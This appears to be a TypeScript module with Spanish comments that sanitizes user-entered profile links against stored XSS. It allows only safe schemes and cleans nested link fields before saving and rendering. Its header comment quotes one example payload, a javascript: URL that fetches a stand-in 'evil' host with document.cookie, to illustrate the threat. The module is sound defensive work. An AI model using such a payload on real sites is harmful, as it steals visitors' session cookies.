// Saneamiento central de URLs provistas por el usuario.
//
// Por qué existe: cualquier campo de enlace del editor (contacto del hero,
// redes sociales, enlace de compra de un producto, reserva de un servicio,
// crédito externo...) termina en un atributo href que el navegador de CADA
// VISITANTE del perfil ejecuta. Un esquema `javascript:` ahí es XSS
// almacenado: el artista escribe `javascript:fetch('//evil/'+document.cookie)`
// una vez y se dispara en la sesión de todos los que abran su página.
//
// Ojo: la Content-Security-Policy NO protege de esto. `script-src` no
// gobierna los esquemas de navegación de un <a href>, así que el único
// control real es no emitir nunca un href que no sea de un esquema seguro.
//
// Se aplica en DOS capas a propósito (defensa en profundidad):
//   1. Al guardar, en el inspector del editor — para no persistir basura.
//   2. Al renderizar, en cada bloque — porque en la base ya puede haber
//      datos viejos guardados antes de que esta validación existiera, y
//      porque las filas son escribibles vía la API REST de Supabase, no
//      solo desde nuestro editor.

// Esquemas que un enlace de perfil puede tener legítimamente.
// `http:` entra solo para no romper enlaces viejos; el header
// upgrade-insecure-requests de next.config.mjs los promueve a https.
const SAFE_PROTOCOLS = new Set(["https:", "http:", "mailto:", "tel:"])

// Quita los caracteres de control (U+0000-U+001F y U+007F). Son el truco
// clásico para colar un tab o un salto de línea dentro de "javascript:",
// que varios navegadores toleran al navegar pero que un chequeo ingenuo de
// startsWith("javascript:") no detecta.
//
// Se compara por código de caracter y no con un regex literal a propósito:
// meter bytes de control crudos en el fuente rompe editores y diffs.
function stripControlChars(input: string): string {
  let out = ""
  for (const char of input) {
    const code = char.charCodeAt(0)
    if (code >= 0x20 && code !== 0x7f) out += char
  }
  return out
}

/**
 * Devuelve una URL segura para usar en un atributo href, o null si el valor
 * no es utilizable. Nunca lanza.
 *
 * - Acepta URLs absolutas con esquema seguro (https, http, mailto, tel).
 * - Acepta rutas relativas propias ("/algo") — útiles para enlaces internos.
 * - Acepta un dominio pelado ("miweb.com") asumiendo https, que es lo que la
 *   gente escribe en la práctica cuando pega su sitio.
 * - Rechaza todo lo demás: javascript:, data:, vbscript:, blob:, file:...
 */
export function safeUrlOrNull(raw: unknown): string | null {
  if (typeof raw !== "string") return null

  const value = stripControlChars(raw).trim()
  if (!value) return null

  // Rutas internas: seguras por definición, no pasan por el parser de URL
  // (que las rechazaría por falta de base). "//evil.com" NO entra acá: es un
  // protocol-relative que apunta afuera, y lo dejamos que caiga al parser.
  if (value.startsWith("/") && !value.startsWith("//")) return value

  // Un valor sin esquema es casi siempre un dominio que el usuario escribió a
  // mano ("miweb.com", "www.miweb.com/algo"). Se le antepone https en vez de
  // descartarlo. El chequeo de esquema evita tratar "javascript:alert(1)"
  // como si fuera un dominio.
  const hasScheme = /^[a-z][a-z0-9+.-]*:/i.test(value)
  if (!hasScheme) {
    if (!value.includes(".") || /\s/.test(value)) return null
    return safeUrlOrNull(`https://${value}`)
  }

  let parsed: URL
  try {
    parsed = new URL(value)
  } catch {
    return null
  }

  if (!SAFE_PROTOCOLS.has(parsed.protocol)) return null

  // Un http:/https: sin host ("https:///x") no lleva a ningún lado y suele
  // ser un intento de confundir al parser.
  if ((parsed.protocol === "https:" || parsed.protocol === "http:") && !parsed.hostname) return null

  return parsed.toString()
}

/**
 * Versión para usar directamente en JSX: siempre devuelve un string.
 * Un valor inseguro se degrada a "#" (enlace inerte) en vez de romper el
 * layout del bloque.
 *
 *   <a href={safeHref(product.purchaseUrl)}>Comprar</a>
 */
export function safeHref(raw: unknown): string {
  return safeUrlOrNull(raw) ?? "#"
}

/**
 * True si el valor produce un enlace navegable. Sirve para decidir si
 * mostrar el botón/enlace en lugar de renderizar uno muerto.
 */
export function isSafeUrl(raw: unknown): boolean {
  return safeUrlOrNull(raw) !== null
}

/**
 * Saneador para el momento de GUARDAR (inspector del editor). A diferencia
 * de safeHref, devuelve "" para lo inválido: no queremos persistir "#" como
 * si fuera un enlace real del artista.
 */
export function sanitizeUrlForStorage(raw: unknown): string {
  return safeUrlOrNull(raw) ?? ""
}

// Nombres de propiedad que, en cualquier parte del contenido de un bloque,
// producto o servicio, terminan en un href navegable. Se sanean al publicar.
//
// Deliberadamente NO incluye los campos de media (image, cover, banner,
// audioUrl, photo, thumbnail): esos van a <img>/<audio>, no a un href, y
// apuntan a R2 por https — pasarlos por el saneador no aporta nada y sí
// arriesga romper contenido válido.
const URL_FIELD_NAMES = new Set([
  "contactUrl",
  "href",
  "purchaseUrl",
  "bookingUrl",
  "externalUrl",
  "url",
])

/**
 * Recorre cualquier estructura (bloques, productos, servicios) y sanea todos
 * los campos de enlace que encuentre, sin importar cuán anidados estén.
 * Devuelve una copia; no muta la entrada.
 *
 * Se llama en handlePublish para que la base nunca reciba un `javascript:`,
 * aunque el usuario lo haya escrito o alguien haya inyectado la fila por la
 * API REST. Es la capa de "no persistir basura" que complementa a safeHref
 * en el renderizado.
 */
export function sanitizeUrlFields<T>(value: T): T {
  if (Array.isArray(value)) {
    return value.map((item) => sanitizeUrlFields(item)) as unknown as T
  }
  if (value && typeof value === "object") {
    const out: Record<string, unknown> = {}
    for (const [key, val] of Object.entries(value as Record<string, unknown>)) {
      if (URL_FIELD_NAMES.has(key) && typeof val === "string" && val) {
        out[key] = sanitizeUrlForStorage(val)
      } else {
        out[key] = sanitizeUrlFields(val)
      }
    }
    return out as unknown as T
  }
  return value
}
